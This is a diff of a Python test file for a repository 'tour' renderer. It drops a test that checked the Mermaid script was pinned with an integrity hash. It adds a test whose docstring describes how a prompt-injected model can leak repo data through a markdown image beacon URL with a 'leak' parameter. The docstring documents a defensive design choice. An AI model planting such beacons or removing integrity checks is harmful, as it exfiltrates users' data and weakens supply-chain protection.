@@ -3,8 +3,6 @@ import subprocess
 import sys
 from importlib.metadata import version
 
-from crawl.core.theme import HEAD_ASSETS
-
 from crawl.analyses.tour.render import (
     available_lenses,
     build_mermaid,
@@ -79,10 +77,21 @@ def test_build_mermaid_renders_inferred_edge_as_dashed_arrow():
     assert 'A0 -. "guesses" .-> A1' in out
 
 
-def test_mermaid_script_is_pinned_and_has_integrity():
-    assert "mermaid/dist/mermaid.min.js\"" not in HEAD_ASSETS  # unpinned "latest"
-    assert "@11.17.2/dist/mermaid.min.js" in HEAD_ASSETS
-    assert 'integrity="sha384-' in HEAD_ASSETS
+def test_the_tour_opts_back_into_markdown_images():
+    """A deliberate divergence from crawl.core.render, which disables images
+    because one is a beacon: `![x](https://host/p?leak=...)` becomes a live
+    <img> that fires on page open, an egress channel from repo text via a
+    prompt-injected model (coderay-q2r.53).
+
+    The tour builds its parser with image=True, on the judgment that a reading
+    document should show the diagrams a README embeds. Nothing recorded that
+    choice, so it read as an oversight rather than a decision.
+    """
+    out = md_to_html("![a diagram](https://example.com/d.png?who=me)")
+    assert "<img" in out, "the tour no longer renders images; was that deliberate?"
+    from crawl.core.render import markdown_parser
+    assert "<img" not in markdown_parser().render("![a](https://example.com/d.png)"), (
+        "core now renders images too, so the tour is no longer diverging")
 
 
 def test_available_lenses_matches_instructions_directory():
